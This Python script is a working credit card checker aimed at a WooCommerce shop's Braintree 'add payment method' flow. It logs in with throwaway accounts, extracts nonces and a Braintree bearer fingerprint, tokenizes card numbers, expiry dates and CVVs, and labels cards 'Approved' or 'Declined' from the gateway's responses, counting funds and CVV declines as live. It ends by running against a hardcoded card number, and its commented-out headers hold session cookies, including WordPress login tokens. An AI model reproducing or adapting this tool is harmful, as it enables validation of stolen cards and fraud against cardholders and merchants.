import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent

class Autocomplet:
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    def cut_str(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = Autocomplet().cut_str(self._tokenEncoding, '"authorizationFingerprint":"', '","')

        return self.bear_end
def parseX(data, first, last):
    try:
        return re.search(f'{first}(.*?){last}', data).group(1)
    except:
        return None 
@dataclass
class b35:
    def __init__(self, tarjeta):

            partes = tarjeta.split("|")
        
            self.tarjeta = tarjeta
            if len(partes) == 4:
                self.cc = partes[0]
                self.mes = partes[1]
                self.ano = partes[2]
                self.cvv = partes[3]

    def main(self):
        try:
            match random.randint(1, 5):
                case 1:
                    email = "cafalok207@murkstar.com"
                case 2:
                    email = "banes42563@rohoza.com"
                case 3:
                    email = "tinag36418@murkstar.com"
                case 4:
                    email = "rafexo6469@murkstar.com"
                case 5:
                    email = "fefifi2552@netiren.com"
            session = Session()
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            Agent = UserAgent().random
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://rchtolive.com/my-account/',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; sbjs_session=pgs%3D41%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2F',
            }

            response = session.get('https://rchtolive.com/my-account/', headers=headers)
            login = parseX(response.text, 'name="woocommerce-login-nonce" value="', '"')
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://rchtolive.com',
                'priority': 'u=0, i',
                'referer': 'https://rchtolive.com/my-account/',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; sbjs_session=pgs%3D45%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2F',
            }

            data = {
                'username': email,
                'password': 'leito132asd',
                'woocommerce-login-nonce': login,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }

            response = session.post('https://rchtolive.com/my-account/', headers=headers, data=data)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'priority': 'u=0, i',
                'referer': 'https://rchtolive.com/my-account/payment-methods/',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; wordpress_logged_in_e308604c48530797675d5ec81dc23d4f=ldfl.dsdasd-5140%7C1784410723%7CpwgCyelh2wtnw6HpQBJaxmlSuOy6sQ8s0I673XCWA7V%7Ca149bf61b7204b046a7063e3812d38161557f57a60fb4f22b1ed2c9566b8441f; sbjs_session=pgs%3D47%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2Fpayment-methods%2F',
            }

            response = session.get('https://rchtolive.com/my-account/add-payment-method/', headers=headers).text
            addpayment = parseX(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            clientnonce = parseX(response, '"client_token_nonce":"','",')

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://rchtolive.com',
                'priority': 'u=1, i',
                'referer': 'https://rchtolive.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': Agent,
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'wordpress_sec_e308604c48530797675d5ec81dc23d4f=ldfl.dsdasd-5140%7C1784410723%7CpwgCyelh2wtnw6HpQBJaxmlSuOy6sQ8s0I673XCWA7V%7Ce22466f6092c3367cdb760a97a8a0c7fdc2f2f4842e414ff3012d655d66c9a2f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; wordpress_logged_in_e308604c48530797675d5ec81dc23d4f=ldfl.dsdasd-5140%7C1784410723%7CpwgCyelh2wtnw6HpQBJaxmlSuOy6sQ8s0I673XCWA7V%7Ca149bf61b7204b046a7063e3812d38161557f57a60fb4f22b1ed2c9566b8441f; sbjs_session=pgs%3D48%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2Fadd-payment-method%2F',
            }

            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': clientnonce,
            }

            response = session.post('https://rchtolive.com/wp-admin/admin-ajax.php', headers=headers, data=data).json()
            eyj2 = response['data']
            decode = base64.b64decode(eyj2)
            decode_string = decode.decode("utf-8")

            json_data = json.loads(decode_string)   

            bearer = json_data.get('authorizationFingerprint')

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.6',
                'authorization': f'Bearer {bearer}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'sec-gpc': '1',
                'user-agent': Agent,
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': str(uuid.uuid4()),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.cc,
                            'expirationMonth': self.mes,
                            'expirationYear': self.ano,
                            'cvv': self.cvv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
            token = response['data']['tokenizeCreditCard']['token']

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://rchtolive.com',
                'priority': 'u=0, i',
                'referer': 'https://rchtolive.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; wordpress_logged_in_e308604c48530797675d5ec81dc23d4f=ldfl.dsdasd-5140%7C1784410723%7CpwgCyelh2wtnw6HpQBJaxmlSuOy6sQ8s0I673XCWA7V%7Ca149bf61b7204b046a7063e3812d38161557f57a60fb4f22b1ed2c9566b8441f; sbjs_session=pgs%3D48%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2Fadd-payment-method%2F',
            }

            data = [
                ('payment_method', 'braintree_credit_card'),
                ('wc-braintree-credit-card-card-type', 'visa'),
                ('wc-braintree-credit-card-3d-secure-enabled', ''),
                ('wc-braintree-credit-card-3d-secure-verified', ''),
                ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
                ('wc_braintree_credit_card_payment_nonce', token),
                ('wc_braintree_device_data', '{"correlation_id":"2ad7096e-abc0-491f-b74f-d8426436"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                ('wc_braintree_paypal_payment_nonce', ''),
                ('wc_braintree_device_data', '{"correlation_id":"2ad7096e-abc0-491f-b74f-d8426436"}'),
                ('wc-braintree-paypal-context', 'shortcode'),
                ('wc_braintree_paypal_amount', '0.00'),
                ('wc_braintree_paypal_currency', 'USD'),
                ('wc_braintree_paypal_locale', 'en_us'),
                ('wc-braintree-paypal-tokenize-payment-method', 'true'),
                ('woocommerce-add-payment-method-nonce', addpayment),
                ('_wp_http_referer', '/my-account/add-payment-method/'),
                ('woocommerce_add_payment_method', '1'),
            ]

            response = session.post('https://rchtolive.com/my-account/add-payment-method/',  headers=headers, data=data)
            soup = BeautifulSoup(response.text, "html.parser")

            err = soup.find("div", class_="wc-block-components-notice-banner__content").get_text(strip=True)     
            if "Nice! New payment method added" in err: 
                return 'Approved! ✅', 'Charged $0.00'
            elif "Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)" in err:
                return 'Approved! ✅', err
            elif "Status code 2001: Insufficient Funds (51 : DECLINED)" in err:
                return 'Approved! ✅', err
            else:
                return 'Declined ❌', err
        except:return 'Declined ❌', 'Unknown Error'
chk = b35("5256103697765164|03|2028|255").main()
print(chk)